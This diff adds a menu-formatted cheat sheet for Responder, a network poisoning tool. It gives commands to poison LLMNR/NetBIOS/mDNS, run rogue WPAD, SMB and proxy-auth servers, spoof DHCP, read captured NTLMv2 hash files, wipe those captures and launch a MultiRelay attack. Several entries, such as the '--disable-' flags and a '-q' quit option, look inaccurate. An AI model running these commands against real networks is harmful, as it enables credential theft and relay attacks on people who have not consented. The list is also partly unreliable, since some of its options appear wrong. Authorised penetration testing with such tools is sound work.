@@ -1,0 +1,132 @@
+# Responder Command List
+# Format: [\] command [/] description [X] menutitlename
+
+[X] Responder Command List
+
+# -------------------------
+# INSTALLATION & LOCATION
+# -------------------------
+
+[\] sudo apt install responder
+[/] Install Responder on Ubuntu/Debian
+
+[\] cd /usr/share/responder
+[/] Navigate to Responder directory
+
+[\] ls /usr/share/responder
+[/] List Responder modules and config files
+
+# -------------------------
+# BASIC USAGE
+# -------------------------
+
+[\] sudo responder -I <interface>
+[/] Start Responder on a network interface
+
+[\] sudo responder -I eth0
+[/] Run Responder on eth0
+
+[\] sudo responder -I wlan0
+[/] Run Responder on wlan0
+
+# -------------------------
+# COMMON OPTIONS
+# -------------------------
+
+[\] sudo responder -I eth0 -v
+[/] Verbose mode
+
+[\] sudo responder -I eth0 -f
+[/] Fingerprint hosts
+
+[\] sudo responder -I eth0 -A
+[/] Analyze mode (no poisoning)
+
+[\] sudo responder -I eth0 -w
+[/] Enable WPAD rogue server
+
+[\] sudo responder -I eth0 -F
+[/] Force WPAD authentication
+
+[\] sudo responder -I eth0 -r
+[/] Enable rogue SMB server
+
+[\] sudo responder -I eth0 -d
+[/] Enable DHCP spoofing
+
+[\] sudo responder -I eth0 -P
+[/] Enable proxy authentication capture
+
+# -------------------------
+# DISABLING SPECIFIC POISONERS
+# -------------------------
+
+[\] sudo responder -I eth0 --disable-LLMNR
+[/] Disable LLMNR poisoning
+
+[\] sudo responder -I eth0 --disable-NBTNS
+[/] Disable NetBIOS poisoning
+
+[\] sudo responder -I eth0 --disable-MDNS
+[/] Disable mDNS poisoning
+
+[\] sudo responder -I eth0 --disable-SMB
+[/] Disable SMB server
+
+[\] sudo responder -I eth0 --disable-HTTP
+[/] Disable HTTP server
+
+[\] sudo responder -I eth0 --disable-FTP
+[/] Disable FTP server
+
+[\] sudo responder -I eth0 --disable-POP
+[/] Disable POP server
+
+[\] sudo responder -I eth0 --disable-SQL
+[/] Disable SQL server
+
+# -------------------------
+# CONFIGURATION FILES
+# -------------------------
+
+[\] nano /usr/share/responder/Responder.conf
+[/] Edit Responder configuration
+
+[\] nano /usr/share/responder/logs/
+[/] View logs directory
+
+# -------------------------
+# LOGS & CAPTURED HASHES
+# -------------------------
+
+[\] ls /usr/share/responder/logs/
+[/] List captured hashes and logs
+
+[\] cat /usr/share/responder/logs/SMB-NTLMv2-Client-*.txt
+[/] View captured NTLMv2 hashes
+
+[\] cat /usr/share/responder/logs/HTTP-NTLMv2-*.txt
+[/] View HTTP NTLMv2 hashes
+
+# -------------------------
+# CLEANUP
+# -------------------------
+
+[\] sudo responder -I eth0 -q
+[/] Quit Responder cleanly
+
+[\] sudo rm /usr/share/responder/logs/*
+[/] Clear logs and captured hashes
+
+# -------------------------
+# ADVANCED MODULES
+# -------------------------
+
+[\] python3 Responder.py -I eth0 -v
+[/] Run Responder manually via Python
+
+[\] python3 MultiRelay.py -t <target>
+[/] Use MultiRelay attack (if installed)
+
+[\] python3 RunFinger.py -I eth0
+[/] Run network fingerprinting module
